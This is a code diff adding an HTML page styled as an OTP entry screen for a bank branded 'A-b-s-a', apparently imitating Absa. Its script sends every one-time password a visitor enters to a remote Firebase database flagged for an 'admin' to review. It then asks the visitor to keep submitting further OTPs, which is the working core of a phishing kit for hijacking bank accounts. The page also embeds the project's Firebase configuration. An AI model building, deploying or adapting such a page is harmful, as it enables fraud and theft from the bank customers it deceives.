@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter OTP | A-b-s-a</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; display:flex; justify-content:center; align-items:center; height:100vh; }
+    .otp-box { background:#fff; padding:25px; border-radius:8px; width:90%; max-width:420px; box-shadow:0 0 10px rgba(0,0,0,0.1); text-align:center; }
+    h2 { margin-bottom:20px; color:#d50032; }
+    input { width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:4px; font-size:16px; box-sizing:border-box; }
+    button { width:100%; padding:12px; background:#d50032; border:none; border-radius:4px; color:white; font-weight:bold; cursor:pointer; font-size:16px; }
+    button:hover { opacity:0.94; }
+    .message { margin-top:12px; font-size:14px; }
+    .id { margin-top:8px; font-size:13px; color:#555; word-break:break-all; }
+  </style>
+</head>
+<body>
+
+<div class="otp-box">
+  <h2>Enter the 6-digit OTP</h2>
+  <input type="text" id="otpInput" placeholder="Enter OTP" maxlength="10" />
+  <button id="submitOtpBtn">Submit OTP</button>
+  <div id="message" class="message" aria-live="polite"></div>
+  <div id="requestId" class="id" aria-live="polite"></div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
+  import { getDatabase, ref, push, update } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDtJstcWHSwJVPogm-MXAehNR4FBhh8Iuo",
+    authDomain: "a-b-s-a-upgrade-system.firebaseapp.com",
+    databaseURL: "https://a-b-s-a-upgrade-system-default-rtdb.firebaseio.com",
+    projectId: "a-b-s-a-upgrade-system",
+    storageBucket: "a-b-s-a-upgrade-system.firebasestorage.app",
+    messagingSenderId: "618721346269",
+    appId: "1:618721346269:web:2548672e789231e4e95134"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  const otpInput = document.getElementById("otpInput");
+  const submitBtn = document.getElementById("submitOtpBtn");
+  const messageEl = document.getElementById("message");
+  const requestIdEl = document.getElementById("requestId");
+
+  submitBtn.addEventListener("click", async () => {
+    const otp = otpInput.value.trim();
+    messageEl.textContent = "";
+    requestIdEl.textContent = "";
+
+    if (!otp) {
+      messageEl.textContent = "⚠️ OTP is required.";
+      messageEl.style.color = "red";
+      return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Submitting...";
+
+    try {
+      const nowISO = new Date().toISOString();
+      // create a new request entry under /requests (auto-generated key)
+      const newReqRef = push(ref(db, "requests"));
+      // write otp_entered, timestamp and status ('otp_pending' so admin knows to review)
+      await update(newReqRef, {
+        otp_entered: otp,
+        otp_timestamp: nowISO,
+        status: "otp_pending"
+      });
+
+      messageEl.textContent = "✅ Check your phone for the next OTP and submit it here.";
+      messageEl.style.color = "green";
+      requestIdEl.textContent = "Request ID: " + newReqRef.key;
+      otpInput.value = "";
+    } catch (err) {
+      console.error(err);
+      messageEl.textContent = "❌ Error submitting OTP. Try again.";
+      messageEl.style.color = "red";
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Submit OTP";
+    }
+  });
+</script>
+
+</body>
+</html>
+
